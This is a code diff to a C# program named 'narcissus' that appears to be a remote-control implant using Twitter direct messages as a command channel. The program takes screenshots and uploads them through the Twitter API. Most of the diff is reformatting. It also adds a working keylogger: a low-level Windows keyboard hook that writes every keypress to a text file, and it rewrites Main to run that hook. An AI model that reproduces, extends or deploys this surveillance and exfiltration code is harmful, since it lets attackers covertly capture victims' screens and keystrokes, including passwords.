@@ -8,12 +8,14 @@
 
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Net.Http;
 using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -24,6 +26,7 @@ using System.Windows.Forms;
 
 namespace narcissus
 {
+
     public class Target
     {
         public string recipient_id { get; set; }
@@ -106,10 +109,11 @@ namespace narcissus
         static readonly string oauthToken = apiKeys[2];
         static readonly string oauthKeySecret = apiKeys[1];
         static readonly string oauthTokenSecret = apiKeys[3];
+        static IntPtr hookID = IntPtr.Zero;
 
 
         public async Task<string> GetAsync(HttpClient requestClient, string url)
-        {            
+        {
             using (var response = await requestClient.GetAsync(url))
             {
                 return await response.Content.ReadAsStringAsync();
@@ -126,7 +130,7 @@ namespace narcissus
         }
 
 
-        public string Build_AuthHeader(string nonce, string timestamp, string method, string url, Dictionary<string, string> requestParams=null)
+        public string Build_AuthHeader(string nonce, string timestamp, string method, string url, Dictionary<string, string> requestParams = null)
         {
             Dictionary<string, string> authorizationParams = new Dictionary<string, string>();
             authorizationParams.Add("oauth_nonce", nonce);
@@ -137,9 +141,9 @@ namespace narcissus
             authorizationParams.Add("oauth_version", "1.0");
 
             Dictionary<string, string> signatureParams = new Dictionary<string, string>(authorizationParams);
-            if(requestParams != null)
+            if (requestParams != null)
             {
-                foreach(KeyValuePair<string,string> paramPair in requestParams)
+                foreach (KeyValuePair<string, string> paramPair in requestParams)
                 {
                     signatureParams.Add(paramPair.Key, paramPair.Value);
                 }
@@ -148,11 +152,11 @@ namespace narcissus
             string signatureBaseString = "";
             List<string> paramKeys = signatureParams.Keys.ToList();
             paramKeys.Sort();
-            foreach(string requestParam in paramKeys)
+            foreach (string requestParam in paramKeys)
             {
-                if(requestParam == paramKeys.First())
+                if (requestParam == paramKeys.First())
                 {
-                    signatureBaseString = signatureBaseString + 
+                    signatureBaseString = signatureBaseString +
                         Uri.EscapeDataString(requestParam) +
                         "=" +
                         Uri.EscapeDataString(signatureParams[requestParam]);
@@ -163,7 +167,7 @@ namespace narcissus
                         Uri.EscapeDataString(requestParam) +
                         "=" +
                         Uri.EscapeDataString(signatureParams[requestParam]);
-                }  
+                }
             }
 
             string signatureString = String.Format("{0}&{1}&{2}",
@@ -171,8 +175,8 @@ namespace narcissus
                 Uri.EscapeDataString(url),
                 Uri.EscapeDataString(signatureBaseString));
 
-            byte[] signingKey = Encoding.UTF8.GetBytes(Uri.EscapeDataString(oauthKeySecret) + 
-                "&" + 
+            byte[] signingKey = Encoding.UTF8.GetBytes(Uri.EscapeDataString(oauthKeySecret) +
+                "&" +
                 Uri.EscapeDataString(oauthTokenSecret));
 
             HMACSHA1 oauthSigner = new HMACSHA1(signingKey);
@@ -184,9 +188,9 @@ namespace narcissus
             string headerString = "";
             List<string> headerKeys = authorizationParams.Keys.ToList();
             headerKeys.Sort();
-            foreach(string headerParam in headerKeys)
-            {   
-                if(headerParam == headerKeys.Last())
+            foreach (string headerParam in headerKeys)
+            {
+                if (headerParam == headerKeys.Last())
                 {
                     headerString = headerString +
                     Uri.EscapeDataString(headerParam) +
@@ -218,7 +222,7 @@ namespace narcissus
             UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
             string formTimestamp = timestamp.ToString();
             string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusDMClient.BaseAddress.ToString() + dmReceiveUrl);
-          
+
             narcissusDMClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
             string twitterResponse = narcissusMain.GetAsync(narcissusDMClient, dmReceiveUrl).Result;
 
@@ -247,7 +251,7 @@ namespace narcissus
                     "\"target\": {\"recipient_id\": " + "\"" + sendDMParams["message_create.target.recipient_id"] + "\"" + "}," +
                     "\"message_data\": {\"text\": " + "\"" + sendDMParams["message_create.message_data"] + "\"";
 
-            if(mediaType != null && mediaID != null)
+            if (mediaType != null && mediaID != null)
             {
                 postData = postData + ", \"attachment\": {\"type\": \"" + mediaType + "\", \"media\": {\"id\": \"" + mediaID + "\" }}";
             }
@@ -267,7 +271,7 @@ namespace narcissus
         public void GetScreenshot(string targetPath)
         {
             Bitmap screenBmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            using(Graphics g = Graphics.FromImage(screenBmp))
+            using (Graphics g = Graphics.FromImage(screenBmp))
             {
                 g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                 screenBmp.Save(targetPath);
@@ -317,7 +321,7 @@ namespace narcissus
             //narcissusImageClient.DefaultRequestHeaders.TransferEncoding.Add(new System.Net.Http.Headers.TransferCodingHeaderValue("BASE64"));
             //narcissusImageClient.DefaultRequestHeaders.TransferEncodingChunked = true;
 
-     
+
 
             int chunkSize = 32766;
             int nChunks = imageContent.Length / chunkSize;
@@ -390,6 +394,50 @@ namespace narcissus
             string finalizeResponse = narcissusMain.FinalizeImageUpload(responseData.media_id_string);
 
             return responseData.media_id_string;
+        }
+
+        //Keylogger code
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(int hCode, IntPtr vKeyCode, IntPtr keyMemLoc)
+        {
+            if(hCode >= 0 && vKeyCode == (IntPtr)0x0100)
+            {
+                int vKey = Marshal.ReadInt32(keyMemLoc);
+                File.AppendAllText("C:\\users\\taduser\\desktop\\keylog.txt", ((Keys)vKey).ToString());
+            }
+            return CallNextHookEx(hookID, hCode, vKeyCode, keyMemLoc);
+        }
+
+        private static IntPtr SetKeyboardHook(LowLevelKeyboardProc keyboardProc)
+        {
+            using (Process mainProcess = Process.GetCurrentProcess())
+            using (ProcessModule currentModule = mainProcess.MainModule)
+            {
+                return SetWindowsHookEx(13, keyboardProc, GetModuleHandle(currentModule.ModuleName), 0);
+            }
+        }
+
+        public static void hold(object time)
+        {
+            Thread.Sleep(Convert.ToInt32(time) * 1000);
         }
 
 
@@ -495,11 +543,16 @@ namespace narcissus
 
         static void Main(string[] args)
         {
+            /*
             narcissusDMClient.BaseAddress = new Uri("https://api.twitter.com/");
             narcissusImageClient.BaseAddress = new Uri("https://upload.twitter.com/");
             Thread listenerThread = new Thread(new ThreadStart(MessageListener));
             listenerThread.Start();
             listenerThread.Join();
+            */
+            hookID = SetKeyboardHook(HookCallback);
+            Thread.Sleep(10000);
+            UnhookWindowsHookEx(hookID);  
         }
     }
 }
